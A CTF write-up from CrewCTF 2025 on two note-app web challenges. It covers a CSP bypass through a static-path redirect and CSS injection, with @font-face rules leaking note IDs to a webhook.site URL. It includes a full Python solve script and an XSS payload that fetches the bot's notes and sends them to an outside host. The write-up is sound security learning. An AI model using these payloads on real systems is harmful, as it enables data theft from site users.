---
title: "CSP is not really safe"
description: "CrewCTF 2025 writeup"
summary: "CrewCTF 2025 writeup"
categories: ["Writeup"]
tags: ["Web", "CSP", "CSS injection", "XSS"]
#externalUrl: ""
date: 2025-09-22
draft: false
cover: ../../post/crewctf2025/feature.png
authors:
  - winky
---


## hate-notes

Last weekend, I played CrewCTF 2025 with my team laevatain. There is a challenge related to CSS injection and Content Security Policy (CSP) called `Hate Notes`

![image](https://hackmd.io/_uploads/H1bNUyy2gx.png)

And I was the fifth one to solve it.

![image](https://hackmd.io/_uploads/r1cBU113xl.png)

So let’s jot down what I did. The source is too long so I refer it here : https://github.com/threalwinky/CTF-archive/tree/main/hate-notes/hate-notes

### Overview

First, let’s take a look at the website.

![image](https://hackmd.io/_uploads/S1PhxYAoee.png)

This is just a normal note making website

![image](https://hackmd.io/_uploads/ryMPhy13xx.png)

### Recognize

I try to make a simple note that contains XSS payload

![image](https://hackmd.io/_uploads/rkG5nkJ2xe.png)

But it is blocked by the CSP

![image](https://hackmd.io/_uploads/HkBohkynxl.png)

And this is how the server defines CSP rule. It blocks all default-src `Content-Security-Policy: default-src 'none'`

```js
router.get('/:noteId', async (req, res) => {
  const { noteId } = req.params;
  try {
    const note = await Note.findById(noteId);
    if (!note) {
      return res.status(404).json({ message: 'Note not found' });
    }

    // Look mom, I wrote a raw HTTP response all by myself!
    // Can I go outside now and play with my friends?
    const responseMessage = `HTTP/1.1 200 OK
Date: Sun, 7 Nov 1917 11:26:07 GMT
Last-Modified: the-second-you-blinked
Type: flag-extra-salty, thanks
Length: 1337 bytes of pain
Server: thehackerscrew/1970 
Cache-Control: never-ever-cache-this
Allow: pizza, hugs, high-fives
X-CTF-Player-Reminder: drink-water-and-keep-hydrated
Content-Security-Policy: default-src 'none'

${note.title}: ${note.content}

`
    res.socket.end(responseMessage)
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'Server error' });
  }
});
```

Now I investigate the bot’s behavior when we report a note. we can see that it will go to `/dashboard` contains `reviewNote` parameter

```js
async function visit(ctx, email, password, noteId){
    page = await ctx.newPage();

    // login
    await page.goto(HOSTNAME + '/login');
    await page.waitForSelector('input[name=email]');
    await page.type('input[name=email]', email);
    await page.waitForSelector('input[name=password]');
    await page.type('input[name=password]', password); 
    await page.waitForSelector('button[type=submit]');
    await page.click('button[type=submit]')

    // Review note
    await sleep(2000);
    try{
        await page.goto(HOSTNAME + '/dashboard?reviewNote='+noteId);
    } catch(error) {
        console.log(error);
    }
    await sleep(2000);
    try{page.close()} catch{};

}
```

And this is how the reviewNote feature works

```js
const reviewNote = async (reviewNoteId) => {
    const showNoteDiv = document.getElementById('show-note');
    const response = await fetch(`/api/notes/`+reviewNoteId)
    const note = await response.text();
    showNoteDiv.style.display = 'block';
    
    showNoteDiv.innerHTML = `
        <h3>Note ID: ${reviewNoteId}</h3>
        <p>${note}</p>
    `;
}

let hcaptchaWidgetId = null; 

// Get the 'reviewNote' parameter from the URL
const reviewNoteId = (new URLSearchParams(window.location.search)).get('reviewNote');

// If the reviewNote parameter exists, display it in the 'show-note' div
if (reviewNoteId) {
    reviewNote(reviewNoteId).then(()=>{fetchNotes()});
} else { 
    fetchNotes();
}
```

So we can easily add HTML via previewNote so that it will render in NoteID instead of creating a new note. I try this payload `<img src=x onerror=alert(1)>`, but I still get blocked by CSP

![image](https://hackmd.io/_uploads/Sylmge12el.png)

The reason is the server has set CSP rule for all default routes

```js
app.use((req, res, next) => {
    // Prevent any attack
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Content-Security-Policy', `script-src ${HOSTNAME}/static/dashboard.js https://js.hcaptcha.com/1/api.js; style-src ${HOSTNAME}/static/; img-src 'none'; connect-src 'self'; media-src 'none'; object-src 'none'; prefetch-src 'none'; frame-ancestors 'none'; form-action 'self'; frame-src 'none';`);
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('Cache-Control', 'no-store');
    next();
});
```

Let's check with CSP evaluator, we can see that it's such a strong rule.

![image](https://hackmd.io/_uploads/rkNBOlJ3gl.png)


### The key

But you should notice that

`style-src http://localhost:8000/static/`

This means it allows any CSS source that begins with this URL. Let's see : 

```js
// Serve static files from the 'static' folder
app.get('/static/*splat', (req, res) => {
  const requestedPath = req.path; 

  if (!requestedPath.endsWith('.js') && !requestedPath.endsWith('.css')) {
    return res.redirect(requestedPath.replaceAll('/static',''));
  }

  let file = req.path.slice(req.path.lastIndexOf('/')+1)
  const filePath = path.join(__dirname, 'static', file);
  res.sendFile(filePath);
});
```

Now we can clearly see the vulnerability is that if the filename doesn't end with .js or .css it will remove `/static` and serve the file. Otherwise it will read file from static folder.

Now let's have a small test

* create a note with title `* {color: red;}` and any content

![image](https://hackmd.io/_uploads/Hk_vfl1nlg.png)

Copy it's ID and use this html :

```html
<link rel="stylesheet" href="api/notes/fab640b8-c4d6-447f-b2e6-fbec09e3f69d">
```

Still be blocked

![image](https://hackmd.io/_uploads/rJQTGgyhxg.png)

But what if we add `static/` path before ?

![image](https://hackmd.io/_uploads/S1h17ly2xx.png)

Yeeeee! Now all the text have red color and css injection is completed. Now we can leak content of bot page with @font-face [Using @font-face in CSS injection](https://tripoloski1337.github.io/webex/2024/07/24/exfil-using-only-css.html#:~:text=Since%20there%E2%80%99s%20CSP%20in%20configured%2C%20So%20we%20can%20use%20%40font%2Dface%20and%20check%20if%20the%20unicode%20is%20in%20a%20specific%20range.%20For%20example.). So we need to see what to leak

![image](https://hackmd.io/_uploads/HJhPVly3gg.png)


This is a bot POV and we can leak: 
* href link to flag note contains note ID in `<a>` tag
* The flag content in `<strong>` tag

Since I don't know the flag length in the remote so I choose to leak note ID. Moreover, the server doesn't check the owner of note

```js
router.get('/:noteId', async (req, res) => {
  const { noteId } = req.params;
  try {
    const note = await Note.findById(noteId);
    if (!note) {
      return res.status(404).json({ message: 'Note not found' });
    }
      
...
```

This is an example how I leak href link of a tag :

```css
@font-face{
    font-family:winkya;
    src:url('https://webhook.site/b1465a0c-ae75-431f-9d2d-353e5fd552e5/a');
}
@font-face{
    font-family:winkyb;
    src:url('https://webhook.site/b1465a0c-ae75-431f-9d2d-353e5fd552e5/b');
}
@font-face{
    font-family:winkyc;
    src:url('https://webhook.site/b1465a0c-ae75-431f-9d2d-353e5fd552e5/c');
}
...
a[href^='/api/notes/a']{
    font-family: winkya;
}
a[href^='/api/notes/b']{
    font-family: winkyb;
}
a[href^='/api/notes/c']{
    font-family: winkyc;
}
...
```

And this is my final solve script

```python
import string
import requests
import secrets
import json

URL = "http://localhost:8000/"

ch = string.digits + string.ascii_lowercase + '-'

payload = ""
# id = "71e455ef-10b7-435d-90a1-9d5a352fbed3"
id = ""
for i in ch:
    t1 = f"""@font-face{{font-family:winky{i};src:url('https://webhook.site/b1465a0c-ae75-431f-9d2d-353e5fd552e5/{i}');}}"""
    payload += t1
    
for i in ch:
    t2 = f"""a[href^='/api/notes/{id + i}']{{font-family: winky{i};}}"""
    payload += t2

username = secrets.token_hex(20)
password = secrets.token_hex(20)

session = requests.Session()

def register():
    user = {
        'email': username,
        'password': password
    }
    r = session.post(URL + 'api/auth/register', data=user)

def login():
    user = {
        'email': username,
        'password': password
    }
    r = session.post(URL + 'api/auth/login', data=user)

nid = ""

def create_note():
    note = {
        'title': 'aaaaa{color',
        'content': 'blue;}' + payload
    }
    r = session.post(URL + 'api/notes', data=note, cookies={'token': session.cookies['token']})
    j = json.loads(r.text)
    global nid
    nid = j['id']

def report():
    n = {
        'noteId': f'<link rel="stylesheet" href="static/api/notes/{nid}">'
    }
    r = session.post(URL + 'report', data=n)
    print(r.text)
    
register()
login()
create_note()
report()
```

when we run, the bot go to the link that contains CSS injection and it leaks first chars of 2 posts ID

![image](https://hackmd.io/_uploads/SJ-Qwlkhee.png)

Now change `id` to 2 and continue to run script we will have next char. Use the same strategy we will have flag in remote: 

![image](https://hackmd.io/_uploads/r1xSPgknxl.png)

`Flag: crew{now_you_solved_it_in_the_right_way_fBi4WVX1kGzPtavs}`

## love-notes

![image](https://hackmd.io/_uploads/rkJjlF0olg.png)

This challenge can be solved using the CSS injection strategy from the above challenge.  but it has more solves, so what is the difference here ?

https://github.com/threalwinky/CTF-archive/blob/ed06a34939fa2979c6335d4948ddef97160f7300/love-notes/love-notes/src/routes/notes.js#L47

The CSP is missing so we can run arbitrary JS code -> Now it turns to normal XSS challenge

![image](https://hackmd.io/_uploads/H1tbbKColx.png)


As we have XSS run in `/api/notes` but the bot will go to `/dashboard?reviewNote` so we need to redirect the bot. However, the CSP in default routes has blocked our script running. After the CTF ended, I read some writeups and find out that we can use `<meta>` tag to redirect


![image](https://hackmd.io/_uploads/H1-B9l12ee.png)

https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Redirections#html_redirections:~:text=via%20the%20DOM-,HTML%20redirections,-HTTP%20redirects%20are

Craft a simple payload and it works. Remember to set the timeout for redirect to `1` because bot will close after 2 seconds `await sleep(2000);`

```html
<meta http-equiv="refresh" content="1; url=api/notes/c2a45b58-406c-4250-be3d-08791d3356b6">
```

![image](https://hackmd.io/_uploads/SJMuVFAsxl.png)

Now to get the bot's notes we have this XSS payload

```
<script>fetch('/api/notes').then(r=>r.text()).then(d=>(location='https://webhook.site/b1465a0c-ae75-431f-9d2d-353e5fd552e5/?'.concat(encodeURIComponent(d))))</script>
```

report with `<meta>` tag and we successfully get XSS. we can see the word `REDACTED` confirms this is the local flag.

`<meta http-equiv="refresh" content="1; url=api/notes/db6a1420-4250-4739-8ff5-30b307d7fef1">`

![image](https://hackmd.io/_uploads/BJTeW-khlx.png)

Now use the same strategy we will exploit the remote

![image](https://hackmd.io/_uploads/rkEkM-Jhee.png)

Let's decode it

![image](https://hackmd.io/_uploads/rkKQMbynle.png)

`Flag: crew{csp_trick_with_a_bit_of_css_spices_fBi4WVX1kGzPtavs}`

